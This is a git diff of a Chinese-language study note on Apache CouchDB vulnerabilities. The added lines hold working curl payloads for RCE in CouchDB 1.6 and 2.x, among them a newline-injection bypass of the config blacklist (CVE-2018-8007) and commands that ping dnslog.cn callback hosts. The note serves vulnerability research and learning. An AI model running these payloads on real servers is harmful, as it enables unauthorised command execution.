@@ -1,6 +1,6 @@
 # CouchDB
 
-CouchDB属于NoSQL数据库的一种，数据库内容以Documents形式而不是表形式存储，有Map/Reduce系统支持。CouchDB用Erlang编写，但允许用户在Javascript中指定文档验证脚本。创建或更新文档时会自动执行这些脚本。 
+CouchDB属于NoSQL数据库的一种，数据库内容以Documents形式而不是表形式存储，有Map/Reduce系统支持。CouchDB用Erlang编写，但允许用户在Javascript中指定文档验证脚本。创建或更新文档时会自动执行这些脚本。  
 官方网址： https://couchdb.apache.org/  
 历史安装版本下载地址：https://archive.apache.org/dist/couchdb/binary/win/1.6.1/  
 历史源码下载： https://archive.apache.org/dist/couchdb/source/1.6.1/  
@@ -9,6 +9,8 @@ CouchDB属于NoSQL数据库的一种，数据库内容以Documents形式而不�
 |:----:|:----:|:----:|
 |CVE-2017-12635|远程权限提升| < 1.7.1 or 2.1.1|
 |CVE-2017-12636|RCE| < 1.7.1 or 2.1.1|
+|CVE-2018-8007|RCE| < 1.7.2 or 2.1.2|
+|CVE-2021-38295|远程权限提升| < 3.1.2|
 
 ### 基本使用
 CouchDB主要有两种管理方式，一种是通过curl发包，另一种是通过自身名为Futon的管理界面  
@@ -30,7 +32,7 @@ CouchDB的Futon管理界面： http://localhost:5984/_utils/
 
 
 ### CVE-2017-12635
-参考链接：https://justi.cz/security/2017/11/14/couchdb-rce-npm.html
+参考链接：https://justi.cz/security/2017/11/14/couchdb-rce-npm.html  
 如果CouchDB安装后配置了用户，那么打开`_users`表会存在一个默认Key`"_design/_auth"`，该Key包含了四个Field：`_id:`_design/_auth、`_rev:xxx`、`language:javascript`、`validate_doc_update:function(xxx)`。`validate_doc_update`字段具体值如下，是javascript的脚本
 ```javascript
     function(newDoc, oldDoc, userCtx, secObj) {
@@ -188,7 +190,7 @@ lists:keysearch(Key, 1, List).
 ```
 
 ### CVE-2017-12636
-参考链接：https://justi.cz/security/2017/11/14/couchdb-rce-npm.html
+参考链接：https://justi.cz/security/2017/11/14/couchdb-rce-npm.html  
 这篇文章中同样提到，如何获取shell。CouchDB允许通过query_server定义语言来执行命令。查询1.6的CouchDB说明文档， `3.8.1 Query Servers Definition`部分说到CouchDB的Design Functions计算功能是由外部查询服务器执行的，而外部查询服务器实际上是一个特殊的操作系统进程，外部查询服务器需要在配置文件中定义
 ```
 [query_servers]
@@ -204,4 +206,66 @@ curl -X PUT 'http://admin:admin@your-ip:5984/my_database'
 curl -X PUT 'http://admin:admin@your-ip:5984/my_database/"001" -d "{\"Name\":\"AxisX\",\"age\":\"18\",\"Title\":\"Hacker\"}" -H "Content-Type: application/json"`
 curl -X POST 'http://admin:admin@your-ip:5984/my_database/_temp_view?limit=10' -d '{"language": "cmd", "map":""}' -H 'Content-Type: application/json'
 ```
+2.1.0版本Payload和1.6版本有很多不同。首先就是接口`/{db}/_temp_view`没有了。那么上面这个1.6的payload就完全不适用了。但是也增加了一些接口`_cluster_setup`、`_membership`等。在查找配置接口的文档中发现，配置接口的访问路径更改为`/_node/{node-name}/_config`，这是由于Couchdb 2.x 引入了集群概念，要具体到某一个节点下进行配置。并且该接口的访问中依然保有`query_servers`这种方式，官方示例代码如下
+```
+"query_servers": {
+    "javascript": "/usr/bin/couchjs /usr/share/couchdb/server/main.js"
+},
+```
+
+那么要先找到一个节点。然后修改其`query_servers`配置。访问`_membership`接口，可以看到集群中所有节点的状态，选择其中一个已有节点，`couchdb@localhost`。
+```
+{"all_nodes":["couchdb@localhost"],"cluster_nodes":["couchdb@localhost"]}
+```
+然后访问该节点的配置接口路径`/_node/couchdb@localhost/_config`。配置完成后还是要考虑触发的问题。查询官方文档`PUT /{db}/_design/{ddoc}`会修订现有Desin Documents，并包含视图对象可以调用view functions。
+
+完整Payload如下
+```
+curl http://localhost:5984/_membership
+curl -X PUT http://localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd -d "\"ping m74ovz.dnslog.cn\""
+curl -X PUT http://localhost:5984/my_database
+curl -X PUT http://localhost:5984/my_database/"001" -d "{\"Name\":\"AxisX\",\"age\":\"18\",\"Title\":\"Hacker\"}" -H "Content-Type: application/json"
+curl -X PUT http://localhost:5984/my_database/_design/"001" -d '{"_id":"_design/test", "views":{"lululu":{"map":""} }," language": "cmd"}' -H "Content-Type: application/json"
+```
+
+### CVE-2018-8007
+参考链接：https://www.mdsec.co.uk/2018/08/advisory-cve-2018-8007-apache-couchdb-remote-code-execution/  
+2.1.1版本再执行CVE-2017-12636中的`/_node/couchdb@localhost/_config/query_servers/cmd`会报错forbidden，显示`Config section blacklisted for modification over HTTP API.`  
+查看源码文件`https://github.com/apache/couchdb/blob/master/src/couch/src/couch_util.erl`，会发现黑名单相关代码如下。query_servers被列入到了黑名单中，符合上面测试中的报错信息。
+```
+define(BLACKLIST_CONFIG_SECTIONS, [
+<<“daemons”>>,
+<<“external”>>,
+<<“httpd_design_handlers”>>,
+<<“httpd_db_handlers”>>,
+<<“httpd_global_handlers”>>,
+<<“native_query_servers”>>,
+<<“os_daemons”>>,
+<<“query_servers”>>
+]).
+ 
+check_config_blacklist(Section) ->
+case lists:member(Section, ?BLACKLIST_CONFIG_SECTIONS) of
+true ->
+Msg = <<“Config section blacklisted for modification over HTTP API.”>>,
+throw({forbidden, Msg});
+_ ->
+ok
+end.
+```
+发现者换了一种写配置文件的方法，将如下内容写到了local.ini中。此时的`os_daemons`在请求体中而不是url中，绕过config对于API的过滤。
+```
+curl -X PUT http://localhost:5984/_node/couchdb@localhost/_config/cors/origins -d "\"http://testdomain.com\n\n[os_daemons]\nhackdaemon=ping h2eidk.dnslog.cn\"" -H "Content-Type: application/json"
+```
+也可以从os_daemons官方文档中找到其他路径来完成访问
+```
+curl -iv -X PUT http://localhost:5984/_node/couchdb@localhost/_config/update_notification/index-updater -d "\"ping h2eidk.dnslog.cn\"" -H "Content-Type: application/json"
+```
+
+### CVE-2021-38295
+参考链接： https://www.secureideas.com/blog/digging-between-the-couch-cushions  
+
+### CVE-2022-24706
+https://www.exploit-db.com/exploits/50914  
+
 
